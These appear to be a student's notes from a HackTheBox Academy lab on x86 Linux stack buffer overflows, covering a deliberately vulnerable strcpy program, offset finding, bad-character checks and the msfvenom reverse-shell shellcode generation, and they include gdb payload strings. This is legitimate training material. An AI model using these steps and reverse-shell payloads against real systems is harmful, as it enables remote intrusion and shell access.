# Linux Stack-Based BOF (x86)
https://academy.hackthebox.com/module/31/section/385

- Vulnerable function `strcpy()`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int BowFunction(char *string) {
    char buffer[1024];
    strcpy(buffer, string);
    return 1;
}

int main(int argc, char *argv[]) {
    BowFunction(argv[1]);
    printf("done.\n");
    return 1;
}

`Disable ASLR`
```bash
student@nix-bow:~$ sudo su
root@nix-bow:/home/student# echo 0 > /proc/sys/kernel/randomize_va_space
root@nix-bow:/home/student# cat /proc/sys/kernel/randomize_va_space
```

`Compile in 32-bit Format` 
```bash
student@nix-bow:~$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
student@nix-bow:~$ file bow32 | tr "," "\n"
```

`Compile in 64-bit Format`
```bash
student@nix-bow:~$ gcc bow.c -o bow64 -fno-stack-protector -z execstack -m64
student@nix-bow:~$ file bow64 | tr "," "\n"
```

- There are several vulnerable functions in C that do not independently protect memory:
```
    - strcpy
    - gets
    - sprintf
    - scanf
    - strcat
    - and more...
```

#### GDB - AT&T Syntax

```bash
student@nix-bow:~$ gdb -q bow32

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    0x4(%esp),%ecx
   0x00000586 <+4>: 	and    $0xfffffff0,%esp
   0x00000589 <+7>: 	pushl  -0x4(%ecx)
   0x0000058c <+10>:	push   %ebp
   0x0000058d <+11>:	mov    %esp,%ebp
   0x0000058f <+13>:	push   %ebx
   0x00000590 <+14>:	push   %ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>


 GDB - Change the Syntax to Intel

(gdb) set disassembly-flavor intel
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>:	    lea    ecx,[esp+0x4]
   0x00000586 <+4>:	    and    esp,0xfffffff0
   0x00000589 <+7>:	    push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>

```
```bash
OR echo 'set disassembly-flavor intel' > ~/.gdbinit
```

#### GDB - Intel Syntax

```bash
student@nix-bow:~$ gdb ./bow32 -q

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    ecx,[esp+0x4]
   0x00000586 <+4>: 	and    esp,0xfffffff0
   0x00000589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>\
```

The difference between the AT&T and Intel syntax is not only in the presentation 
of the instructions with their symbols but also in the order and direction 
in which the instructions are executed and read.

## CPU Registers

```
Data registers
--------------
32-bit Register 	64-bit Register 	Description
===============     ===============     ===========
EAX 	            RAX 	            Accumulator. Input/output/arithmetic.
EBX 	            RBX 	            Base is used in indexed addressing
ECX 	            RCX 	            Counter is used to rotate instructions and count loops
EDX 	            RDX 	            I/O and arithmetic multiply/ divide large values

Pointer registers
-----------------
32-bit Register 	64-bit Register 	Description
===============     ===============     ===========
EIP 	            RIP 	            Instruction Pointer/ next instruction to be executed
ESP 	            RSP 	            Stack Pointer points to the top of the stack
EBP 	            RBP 	            Stack Base Pointer or Frame Pointer

Index registers
---------------
Register 32-bit 	Register 64-bit 	Description
===============     ===============     ===========
ESI 	            RSI 	            Source Index as a pointer from src for string operations
EDI 	            RDI 	            Destination as a pointer to dest for string operations
```

## Stack Frames

Since the stack memory is built on a Last-In-First-Out (LIFO) data structure, 
the first step is to store the previous EBP position on the stack, 
which can be restored after the function completes.

#### Prologue

```bash
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 # <---- 3. Moves ESP to the top
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

#### Epilogue

```bash
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       
   0x0000054e <+1>:	    mov    ebp,esp   
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  # <----------------------
   0x00000581 <+52>:	ret    # <--- Leave stack fram
```

The `call` function performs two operations:
```
    - Pushes the return address onto the stack.
    - Changes the instruction pointer to the call dest and starts execution there.
```

## Taking Control of the EIP

https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png

Overflowing data will fill from the stack pointer, 
past the base pointer and over the instruction pointer

#### Create Pattern

```bash
bluechat@htb[/htb]$ pattern_create -l 1200 > pattern.txt
bluechat@htb[/htb]$ cat pattern.txt

Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9

(gdb) info registers eip
eip            0x69423569	0x69423569
```

#### GDB Offset

```bash
bluechat@htb[/htb]$ pattern_offset -q 0x69423569
[*] Exact match at offset `1036`

(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

We have a perfect overwrite of the EIP.
It's generally best practice to take a bit more space in case of compilation specifications `(1040)`.

## Determining Length for the Shellcode

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 
                lport=31337 --platform linux --arch x86 --format c

No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
<SNIP>
```

Adding NOP sled before the shellcode to ensure that it executes cleanly is a good idea.
```
   - We need a total of 1040 bytes to get to the EIP.
   - Here, we can use an additional 100 bytes of NOPs
   - 150 bytes for our shellcode.

        Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
        NOPs = "\x90" * 100
        Shellcode = "\x44" * 150
        EIP = "\x66" * 4'
```

Try seeing how much space we have for our shellcode, available:
```bash
(gdb) 
run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

Starting program: /home/student/bow/bow32 
$(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```
https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png

## Identifying Bad Characters

Some common (not always) bad characters:
```
    - /x00: Null Byte
    - /x0A: Line Feed
    - /x0D: Carriage Return
    - /xFF: Form Feed
```
A Python tool for quick badchar generation: https://github.com/cytopia/badchars
We should remove /x00 now

#### Notes
```
Buffer = "\x55" * (1040 - 255 - 4) = 780
 CHARS = "\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4


(gdb) break bowfunc 
Breakpoint 1 at 0x56555551

(gdb) 
run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...

Starting program: /home/student/bow/bow32 
$(python -c 'print "\x55" * (1040 - 255 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...

Breakpoint 1, 0x56555551 in bowfunc ()
```
```
(gdb) x/2000xb $esp+500

0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
				 # |---> "\x55"s begin

0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
<SNIP>
```

Here we recognize which address our U's begin. From here, we can look where our CHARS start.

```
<SNIP>
0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
												 # |---> CHARS begin

0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
<SNIP>
```

Without our Null Byte:
```
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
												 # |----| <- "\x09" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
```

We continue looking for missing chars until we've removed all bad chars.

## Generating Shellcode (w/o Bad Characters)

```bash
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```

- Exploiting with Shellcode, from GDB
```
(gdb) 
run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Starting program: /home/student/bow/bow32 
$(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...

Breakpoint 1, 0x56555551 in bowfunc ()
```

Next, check if the fist bytes of our shellcode match the bytes after the NOPS.
```
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |----> Shellcode begins
<SNIP>
```

## Identifying the Return Address

After checking that we still control the EIP with our shellcode, 
we now need a memory address where our NOPs are located to tell the EIP to jump.

This memory address must not contain any of the bad characters.

```
(gdb) x/2000xb $esp+1400

<SNIP>
0xffffd5ec:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5f4:	0x55	0x55	0x55	0x55	0x55	0x55	0x90	0x90
								# End of "\x55"s   ---->|  |---> NOPS
0xffffd5fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd604:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd60c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd614:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd61c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd624:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd62c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd634:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd63c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd644:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |---> Shellcode
<SNIP>
```

Looks like `0xffffd65c` Will be where our shellcode starts. Whaddaya know...
Let's start further back though, with  `0xffffd64c`: We replace our EIP variable with the address.

Remember to keep Endianess in mind when doing this.